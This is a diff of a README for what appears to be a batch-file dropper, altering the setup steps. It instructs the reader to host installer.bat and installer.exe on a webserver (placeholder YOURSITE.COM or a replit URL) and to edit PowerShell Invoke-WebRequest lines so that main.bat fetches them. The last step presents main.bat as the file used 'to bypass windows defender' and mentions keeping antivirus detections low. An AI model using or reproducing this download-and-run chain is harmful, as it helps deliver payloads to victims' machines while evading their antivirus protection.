@@ -10,11 +10,15 @@ If you already have a webserver, skip to step 2.
   
 3, Edit line 31 in the installer.bat file:  
 ```bat
-Powershell -Command "Invoke-Webrequest 'https://YOURSITE.COM/installer.exe' -OutFile installer.exe" # Change https://YOURSITE.COM/installer.exe to your webserver URL. If you use replit, it should look like this: https://replname.wnetmc.repl.co/installer.exe
+Powershell -Command "Invoke-Webrequest 'https://YOURSITE.COM/installer.exe' -OutFile installer.exe"
 ```
+Change https://YOURSITE.COM/installer.exe to your webserver URL. If you use replit, it should look like this: https://replname.wnetmc.repl.co/installer.exe  
+  
 4, Upload the installer.bat to your webserver.
 5, Edit line 4 in the main.bat file:
 ```bat
-Powershell -Command "Invoke-Webrequest 'https://YOURSITE.COM/installer.bat' -OutFile installer.bat" # Replace https://YOURSITE.COM/installer.bat with your webserver URL and the path to the installer.bat file. If you use replit, it should look like this: https://replname.wnetmc.repl.co/installer.bat
+Powershell -Command "Invoke-Webrequest 'https://YOURSITE.COM/installer.bat' -OutFile installer.bat"
 ```
+Replace https://YOURSITE.COM/installer.bat with your webserver URL and the path to the installer.bat file. If you use replit, it should look like this: https://replname.wnetmc.repl.co/installer.bat  
+  
 6, Done. The file you would use to bypass windows defender would be main.bat. You can convert it to an executable but this will raise the number of detections. If this helped you, make sure to star this repository (;
